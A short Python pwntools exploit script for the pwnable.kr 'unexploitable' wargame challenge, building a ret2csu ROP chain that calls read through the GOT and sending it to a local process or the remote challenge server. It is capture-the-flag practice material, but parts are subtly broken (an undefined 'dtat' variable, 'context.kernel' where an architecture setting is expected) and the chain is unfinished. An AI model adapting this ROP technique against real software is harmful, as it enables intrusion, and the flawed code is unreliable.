from pwn import *
import time

context.kernel = "amd64"
LOCAL = True

def mt_send(io, data):
    io.send(dtat)
    time.sleep(0.1)

# main vuln address define
main_vuln_addr = 0x400544
rop64_step1_addr = 0x4005E6
rop64_step2_addr = 0x4005D0
rop_pad_size = 0x38

# start pwn
elf = ELF("./unexploitable")
if LOCAL:
    context.log_level = 'debug'
    io = process("./unexploitable")
else:
    io = remote("pwnable.kr", 22333)

def prod_rop3(func_addr, arg1, arg2, arg3):
    payload = p64(rop64_step1_addr)
    payload += p64(0)
    payload += p64(0)   # rbx
    payload += p64(1)   # rbp
    payload += p64(func_addr)   # r12
    payload += p64(arg1)        # r13
    payload += p64(arg2)        # r14
    payload += p64(arg3)        # r15
    payload += p64(rop64_step2_addr)    # ret to step2
    payload += 'r'*rop_pad_size         # padding
    payload += p64(main_vuln_addr)      # return to main vuln
    return payload

def un_exp():
    time.sleep(3)
    payload = 'p'*0x18
    payload += prod_rop3(elf.got['read'], 0, 0x601030, 0x08)
    io.send(payload)
    time.sleep(0.4)
    io.send('ffffffff')

if __name__ == '__main__':
    raw_input("start")
    un_exp()
    raw_input("end")


